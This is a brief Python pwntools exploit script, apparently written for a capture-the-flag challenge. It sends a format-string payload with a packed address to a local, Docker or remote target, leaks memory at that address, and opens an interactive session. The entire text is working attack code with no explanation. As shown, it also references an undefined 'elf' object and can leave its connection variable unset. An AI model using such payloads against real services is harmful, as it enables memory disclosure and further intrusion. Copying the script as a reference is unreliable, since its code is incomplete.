#!/usr/bin/env python3
from pwn import *

def setup():
    if args.LOCAL:
        p = elf.process()
    if args.DOCKER:
        p = remote("localhost", 12345)
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    
    return p


p = setup()

addr = 0x404008
payload = '%7$s----'.encode() + p64(addr)
p.sendlineafter(b'say: ', payload)

p.recvuntil(b'Wow: ')
addr = p.recvuntil(b'----')[:-4]
print(f'Leaked addr: {addr.hex()}')

p.interactive()